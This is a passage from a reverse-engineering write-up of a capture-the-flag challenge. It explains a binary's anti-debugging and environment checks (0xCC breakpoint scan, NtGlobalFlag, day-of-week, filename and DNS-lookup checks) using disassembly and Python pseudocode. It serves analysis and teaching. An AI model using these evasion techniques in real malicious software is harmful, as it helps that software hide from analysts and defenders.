<h4 id="function-6---i-can-haz-breakpoint">Function 6 - I Can Haz Breakpoint?</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-11.jpg" alt="0xCC Check" title="0xCC Check" /></p>

<p>Offsets from two functions are loaded and then compared. The first one calls <code>isDebuggerPresent</code> and the second one just prints something and exits. We have seen this function before, it is the first check.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>calls_isDebuggerPresent </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="err">01030</span> <span class="nf">calls_isDebuggerPresent</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401030</span> <span class="nf">push</span>    <span class="nb">esi</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401031</span> <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">IsDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401037</span> <span class="nf">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040103</span><span class="nf">D</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040103</span><span class="nf">F</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401041</span> <span class="nf">jz</span>      <span class="nv">short</span> <span class="nv">loc_401079</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>sub_401780 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">sub_401780</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401780</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">arg_0</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401780</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401780</span> <span class="nf">push</span>    <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401781</span> <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401783</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">arg_0</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401786</span> <span class="nf">push</span>    <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401787</span> <span class="nf">push</span>    <span class="nv">offset</span> <span class="nv">aBmoChopD</span> <span class="c1">; &quot;BMO Chop! [%d]\n&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040178</span><span class="nf">C</span> <span class="nv">call</span>    <span class="nv">_printf</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401791</span> <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401794</span> <span class="nf">push</span>    <span class="mh">0FFFFDCD7h</span>      <span class="c1">; uExitCode</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401799</span> <span class="nf">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">ExitProcess</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401799</span> <span class="nf">sub_401780</span> <span class="nv">endp</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>None of these functions are called. But their offsets are compared. If offset of <code>calls_isDebuggerPresent</code> is larger than <code>sub_401780</code> then we jump down and string <code>I can haz decode?</code> is xor-ed with the blob. Otherwise we go right. <strong>I am not quite sure what this check is for</strong>. I think it is trying to find if calls to <code>isDebuggerPresent</code> are redirected or not (by the debugger?) as the address of the first function is <code>0x401030</code> and is smaller than <code>0x401780</code>. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.</p>

<p>To the right we can see a pretty standard <code>0xCC</code> check. <code>0xCC</code> is the code for <code>INT 3</code> and is used by debuggers to set breakpoints. It is simply checking if <code>0xCC</code> bytes are present in the function code. If <code>0xCC</code> is present <code>ecx</code> is increased by 2, otherwise by one. In the end this number is compared with <code>0x55</code>. If the check does not pass it will jump to left (same as above) and <code>I can haz decode?</code> is xor-ed with the blob. If the number is <code>0x55</code> string <code>Such fire. Much burn. Wow.</code> is xor-ed with the blob.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>ICanHaz? </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">calls_isDebuggerPresent</span><span class="o">.</span><span class="n">address</span> <span class="o">&gt;</span> <span class="n">sub_401780</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">calls_isDebuggerPresent</span><span class="o">.</span><span class="n">has0xCC</span> <span class="o">==</span> <span class="bp">True</span> <span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;I can haz decode?&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;Such fire. Much burn. Wow.&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-7---ntglobalflag">Function 7 - NtGlobalFlag</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This one is pretty straightforward. A field inside the <code>PEB</code> (we have already seen it) is called <code>NtGlobalFlag</code>. This flag is at offset <code>0x68</code> in 32-bit versions of Windows (and <code>0xBC</code> for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to <code>0x70</code>. To read more about it, please look at the <a href="http://pferrie.host22.com/papers/antidebug.pdf">Anti-Debugging</a> reference.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-12.jpg" alt="&quot;NtGlobalFlag Checked&quot;" title="NtGlobalFlag Checked" /></p>

<p>If <code>NtGlobalFlag</code> is not <code>0x70</code> then <code>\x09\x00\x00\x01</code> will be xor-ed with the blob, otherwise <code>Feel the sting of the monarch!</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>NtGlobalFlag </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">NtGlobalFlag</span> <span class="o">==</span> <span class="mh">0x70</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;Feel the sting of the monarch!&quot;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x09\x00\x00\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-8---sands-of-time">Function 8 - Sands of Time</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>     <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-13.jpg" alt="Checking day of the week" title="Checking day of the week" /></p>

<p>This is not a countermeasure but a simple check. First <code>time64</code> is called and returns the number of seconds since January 1st 1970. Then <code>localtime64</code> converts it to <a href="http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx">readabled format</a> stored in a structure of type <code>tm</code> according to MSDN:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>tm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="c1">// each field is an int (4 bytes)</span>
</span><span class="line">
</span><span class="line"><span class="nl">tm_sec:</span>     <span class="n">Seconds</span> <span class="n">after</span> <span class="n">minute</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_min:</span>     <span class="n">Minutes</span> <span class="n">after</span> <span class="n">hour</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_hour:</span>    <span class="n">Hours</span> <span class="n">after</span> <span class="n">midnight</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">23</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_mday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">month</span> <span class="p">(</span><span class="mi">1</span> <span class="err">–</span> <span class="mi">31</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_mon:</span>     <span class="n">Month</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">11</span><span class="p">;</span> <span class="n">January</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_year:</span>    <span class="n">Year</span> <span class="p">(</span><span class="n">current</span> <span class="n">year</span> <span class="n">minus</span> <span class="mi">1900</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_wday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">week</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">6</span><span class="p">;</span> <span class="n">Sunday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="nl">offset:</span> <span class="mi">24</span>
</span><span class="line"><span class="nl">tm_yday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">year</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">365</span><span class="p">;</span> <span class="n">January</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class="line"><span class="nl">tm_isdst:</span>   <span class="n">Positive</span> <span class="n">value</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">not</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="n">negative</span> <span class="n">value</span> <span class="k">if</span> <span class="n">status</span> <span class="n">of</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">unknown</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Next instruction <code>cmp dword ptr [eax+18h], 5</code> compares 24th (0x16) byte of the structure with 5. Because each field is of type <code>int</code> and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor <code>! 50 1337</code> with the blob and if it is not Friday blob will be xor-ed with <code>1337</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Day of the week check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">Friday</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;! 50 1337&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;1337&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-9---backdogeexe">Function 9 - Backdoge.exe</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>   <span class="c1">; eax = executable&#39;s name</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>   <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Before next function, executable’s complete path is saved into <code>eax</code>. Then <code>sub_4014F0</code> is called.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-14.jpg" alt="Comparing executable's name with backdoge.exe" title="Comparing executable's name with backdoge.exe" /></p>

<p>Again, this is just a check. Executable’s name is compared with <code>backdoge.exe</code> two characters in each iteration.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-15.jpg" alt="Filename check" title="Filename check" /></p>

<p>The rest is pretty easy. If filename check passes, <code>MATH IS HARD</code> will be xor-ed with the blob and if not <code>LETS GO SHOPPING</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Filename check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">filename</span> <span class="o">==</span> <span class="s">&quot;BackDoge.exe&quot;</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;MATH IS HARD&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;LETS GO SHOPPING&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-10---dogecoincom-ip-check">Function 10 - Dogecoin.com IP Check</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>   <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Another check. This time the application retrieves the IP for <code>www.dogecoin.com</code> using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx">gethostbyname</a>. The result is of the form <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx">hostent</a>:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>hostent structure (for Win32) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">hostent</span> <span class="p">{</span>
</span><span class="line">  <span class="kt">char</span> <span class="n">FAR</span>      <span class="o">*</span><span class="n">h_name</span><span class="p">;</span>        <span class="c1">// index: 0</span>
</span><span class="line">  <span class="kt">char</span> <span class="n">FAR</span>  <span class="n">FAR</span> <span class="o">**</span><span class="n">h_aliases</span><span class="p">;</span>    <span class="c1">// index: 4 </span>
</span><span class="line">  <span class="kt">short</span>         <span class="n">h_addrtype</span><span class="p">;</span>     <span class="c1">// index: 8</span>
</span><span class="line">  <span class="kt">short</span>         <span class="n">h_length</span><span class="p">;</span>       <span class="c1">// index: 9</span>
</span><span class="line">  <span class="kt">char</span> <span class="n">FAR</span>  <span class="n">FAR</span> <span class="o">**</span><span class="n">h_addr_list</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span> <span class="n">HOSTENT</span><span class="p">,</span> <span class="o">*</span><span class="n">PHOSTENT</span><span class="p">,</span> <span class="n">FAR</span> <span class="o">*</span><span class="n">LPHOSTENT</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-16.jpg" alt="Dogecoin.com IP" title="Dogecoin.com IP" /></p>

<p>Then 8th byte will be compared with <code>2</code> which is <code>h_addrtype</code>. According to this <a href="http://stackoverflow.com/q/2549461">stackoverflow answer</a>, it is <code>AF_INET</code> or <code>PF_INET</code> defined in <a href="http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html">bits/socket.h</a>.</p>

<p><code>inet_ntoa</code> is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to <code>127.0.0.1</code> two characters at a time like last check.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-17.jpg" alt="xor paths for ip check" title="xor paths for ip check" /></p>

